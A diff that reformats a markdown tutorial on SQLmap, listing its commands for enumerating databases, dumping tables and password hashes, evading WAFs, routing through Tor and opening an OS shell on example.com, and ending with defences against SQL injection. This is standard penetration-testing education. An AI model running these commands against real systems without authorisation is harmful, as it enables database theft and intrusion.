@@ -1,4 +1,6 @@
-## SQLmap
+<br>
+
+# SQLmap
 SQLmap is **an open-source penetration testing tool designed to automate the detection and exploitation of SQL injection vulnerabilities in web applications**. It is a powerful tool for both attackers and security professionals, capable of identifying vulnerabilities, retrieving data, and even executing commands on compromised databases.
 
 ## 1. Features of SQLmap
@@ -43,73 +45,95 @@ SQLmap works by sending crafted SQL payloads to the target application and analy
 
 ## 3. Common SQLmap Commands
 
-### a. Basic Usage
+### a. Basic Usage  
+
 ```
 sqlmap -u "http://example.com/page?id=1"
 ```
+
 - Tests the id parameter in the URL for SQL injection.
 
-### b. Enumerate Databases
+### b. Enumerate Databases  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --dbs
 ```
+
 - Lists all databases on the target.
 
-### c. Enumerate Tables
+### c. Enumerate Tables  
+
 ```
 sqlmap -u "http://example.com/page?id=1" -D database_name --tables
 ```
+
 - Lists all tables in the specified database.
 
-### d. Dump Table Data
+### d. Dump Table Data  
+
 ```
 sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --dump
 ```
+
 - Extracts all data from the specified table.
 
-### e. Identify Database User
+### e. Identify Database User  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --current-user
 ```
+
 - Retrieves the current database user.
 
-### f. Test All Parameters
+### f. Test All Parameters  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --forms
 ```
+
 - Scans all parameters in forms on the page.
 
-### g. Bypass WAFs
+### g. Bypass WAFs  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --tamper=charencode
 ```
+
 - Uses tamper scripts to bypass Web Application Firewalls (WAFs).
 
-### h. Use Tor for Anonymity
+### h. Use Tor for Anonymity  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --tor
 ```
+
 - Routes traffic through the Tor network.
 
 
 ## 4. Example Scenarios
 
-### a. Dumping Database Credentials
+### a. Dumping Database Credentials  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --passwords
 ```
+
 - Extracts hashed passwords stored in the database.
 
-### b. Discovering Privilege Levels
+### b. Discovering Privilege Levels  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --privileges
 ```
+
 - Identifies privileges of the current database user.
 
-### c. Running OS Commands
+### c. Running OS Commands  
+
 ```
 sqlmap -u "http://example.com/page?id=1" --os-shell
 ```
+
 - Spawns a shell to execute operating system commands (if supported).
 
 
@@ -144,5 +168,5 @@ sqlmap -u "http://example.com/page?id=1" --os-shell
 | Supported DBMS | MySQL, PostgreSQL, SQLite, MSSQL, Oracle, MariaDB. |
 | Mitigation | Input validation, parameterized queries, WAFs, least privilege principle. |
 
-
-**SQLmap is an essential tool for penetration testers, offering powerful features for detecting and exploiting SQL injection vulnerabilities**. While it streamlines vulnerability testing, its **use must be ethical and authorized** to avoid legal and operational risks. Organizations can defend against SQLmap and similar tools by adopting robust security measures like **input validation**, **prepared statements**, and **regular testing**.
+**SQLmap is an essential tool for penetration testers, offering powerful features for detecting and exploiting SQL injection vulnerabilities**. While it streamlines vulnerability testing, its **use must be ethical and authorized** to avoid legal and operational risks. Organizations can defend against SQLmap and similar tools by adopting robust security measures like **input validation**, **prepared statements**, and **regular testing**.  
+<br>
